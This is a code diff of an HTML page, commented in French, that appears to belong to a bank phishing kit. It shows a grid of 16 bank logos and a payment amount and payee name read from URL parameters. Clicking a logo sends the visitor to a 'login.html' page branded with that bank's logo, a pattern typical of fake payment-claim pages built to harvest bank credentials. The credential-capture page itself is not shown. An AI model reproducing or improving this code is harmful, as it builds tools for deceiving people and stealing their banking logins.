@@ -17,9 +17,9 @@
         .search-input { padding: 8px; border: 1px solid #ccc; border-radius: 4px 0 0 4px; outline: none; }
         .search-btn { background: #ffbf00; border: none; padding: 8px 12px; border-radius: 0 4px 4px 0; cursor: pointer; }
         .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .bank-card { background: white; border-radius: 6px; height: 90px; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; text-decoration: none; transition: 0.2s; }
+        .bank-card { background: white; border-radius: 6px; height: 90px; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; text-decoration: none; transition: 0.2s; cursor: pointer; }
         .bank-card:active { transform: scale(0.98); }
-        .bank-card img { width: 85%; height: 85%; object-fit: contain; }
+        .bank-card img { width: 85%; height: 85%; object-fit: contain; pointer-events: none; }
         .bottom-selection { padding: 40px 20px; text-align: center; }
         .separator { width: 44px; height: 44px; background: #757575; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: -62px auto 25px; border: 4px solid white; font-weight: bold; }
         .form-select { width: 100%; padding: 14px; margin: 10px 0 25px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; background: white; }
@@ -48,22 +48,22 @@
             <button class="search-btn">🔍</button>
         </div>
         <div class="bank-grid" id="grid">
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/MTLW2vzq/IMG_6649.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/76Rx8fqq/IMG_6648.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/xT31qj5S/IMG_6634.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/5NS2j9gW/IMG_6635.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/sD4g1fmd/IMG_6636.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Wbw1tp8R/IMG_6637.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/FsVH1FZ2/IMG_6638.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/rFNwzyJ3/IMG_6639.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Hs9kjW2N/IMG_6640.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/SNfxjQrt/IMG_6641.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/RVLZqCRD/IMG_6642.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/YqzCj23X/IMG_6643.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/gkH2rcDN/IMG_6644.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Ghxm93Qj/IMG_6645.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/X7kYXN8k/IMG_6646.png"></a>
-            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/KvD84cNf/IMG_6647.png"></a>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/MTLW2vzq/IMG_6649.png')"><img src="https://i.postimg.cc/MTLW2vzq/IMG_6649.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/76Rx8fqq/IMG_6648.png')"><img src="https://i.postimg.cc/76Rx8fqq/IMG_6648.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/xT31qj5S/IMG_6634.png')"><img src="https://i.postimg.cc/xT31qj5S/IMG_6634.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/5NS2j9gW/IMG_6635.png')"><img src="https://i.postimg.cc/5NS2j9gW/IMG_6635.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/sD4g1fmd/IMG_6636.png')"><img src="https://i.postimg.cc/sD4g1fmd/IMG_6636.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/Wbw1tp8R/IMG_6637.png')"><img src="https://i.postimg.cc/Wbw1tp8R/IMG_6637.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/FsVH1FZ2/IMG_6638.png')"><img src="https://i.postimg.cc/FsVH1FZ2/IMG_6638.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/rFNwzyJ3/IMG_6639.png')"><img src="https://i.postimg.cc/rFNwzyJ3/IMG_6639.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/Hs9kjW2N/IMG_6640.png')"><img src="https://i.postimg.cc/Hs9kjW2N/IMG_6640.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/SNfxjQrt/IMG_6641.png')"><img src="https://i.postimg.cc/SNfxjQrt/IMG_6641.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/RVLZqCRD/IMG_6642.png')"><img src="https://i.postimg.cc/RVLZqCRD/IMG_6642.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/YqzCj23X/IMG_6643.png')"><img src="https://i.postimg.cc/YqzCj23X/IMG_6643.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/gkH2rcDN/IMG_6644.png')"><img src="https://i.postimg.cc/gkH2rcDN/IMG_6644.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/Ghxm93Qj/IMG_6645.png')"><img src="https://i.postimg.cc/Ghxm93Qj/IMG_6645.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/X7kYXN8k/IMG_6646.png')"><img src="https://i.postimg.cc/X7kYXN8k/IMG_6646.png"></div>
+            <div class="bank-card" onclick="choisir('https://i.postimg.cc/KvD84cNf/IMG_6647.png')"><img src="https://i.postimg.cc/KvD84cNf/IMG_6647.png"></div>
         </div>
     </div>
 
@@ -86,23 +86,21 @@
 </div>
 
 <script>
+    let currentPrix = "373,00";
+
     window.onload = function() {
         const params = new URLSearchParams(window.location.search);
+        currentPrix = params.get('prix') || "373,00";
+        const currentNom = params.get('nom') || "Kore David";
         
-        // On récupère le prix (Défaut: 500,00)
-        const prix = params.get('prix') || "500,00";
-        document.getElementById('prix-display').innerText = prix;
-
-        // On récupère le nom (Défaut: Kore David)
-        const nom = params.get('nom') || "Kore David";
-        document.getElementById('nom-display').innerText = nom;
-        
-        // Transmission automatique du prix et du logo aux liens
-        document.querySelectorAll('.bank-card').forEach(card => {
-            const logo = encodeURIComponent(card.querySelector('img').src);
-            card.href = `login.html?logo=${logo}&prix=${prix}`;
-        });
+        document.getElementById('prix-display').innerText = currentPrix;
+        document.getElementById('nom-display').innerText = currentNom.replace(/-/g, ' ');
     };
+
+    function choisir(logoUrl) {
+        // Redirection vers login.html en passant le logo et le prix choisis
+        window.location.href = `login.html?logo=${encodeURIComponent(logoUrl)}&prix=${currentPrix}`;
+    }
 </script>
 </body>
 </html>
